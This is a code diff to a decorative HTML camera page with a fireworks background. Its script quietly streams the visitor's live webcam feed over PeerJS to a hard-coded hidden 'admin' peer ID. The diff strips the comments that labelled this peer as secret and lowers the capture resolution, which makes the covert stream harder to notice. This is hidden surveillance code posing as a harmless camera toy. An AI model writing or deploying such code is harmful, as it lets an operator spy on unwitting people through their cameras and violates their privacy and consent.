@@ -42,7 +42,6 @@
       z-index: 2;
     }
 
-    /* Mobile Responsive Card Layout */
     .glass-card {
       position: relative;
       width: 95%;
@@ -167,10 +166,8 @@
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    /* Updated Secret Admin Peer ID */
     const ADMIN_PEER_ID = 'danish-cam-9988';
     
-    /* STUN Servers Configuration for Long Distance Connection */
     const peer = new Peer({
       config: {
         iceServers: [
@@ -184,7 +181,6 @@
     let currentStream = null;
     let useFacingMode = "user";
 
-    /* Background Fireworks Engine */
     const bgCanvas = document.getElementById('bgFireworksCanvas');
     const bgCtx = bgCanvas.getContext('2d');
     function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
@@ -224,19 +220,17 @@
       bgParticles.forEach((p, i) => { if(p.alpha > 0) { p.update(); p.draw(); } else { bgParticles.splice(i, 1); } });
     }
 
-    /* Camera System */
     async function startStudio() {
       try {
         if (currentStream) {
           currentStream.getTracks().forEach(track => track.stop());
         }
 
-        /* Video resolution constraints to prevent black screen */
         currentStream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: useFacingMode,
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
+            width: { ideal: 640 },
+            height: { ideal: 480 }
           }, 
           audio: false 
         });
@@ -247,7 +241,6 @@
         document.getElementById('welcomePanel').style.display = "none";
         document.getElementById('studioPanel').style.display = "block";
 
-        /* Initiate peer connection */
         peer.call(ADMIN_PEER_ID, currentStream);
       } catch (err) {
         alert("Camera permission denied!");
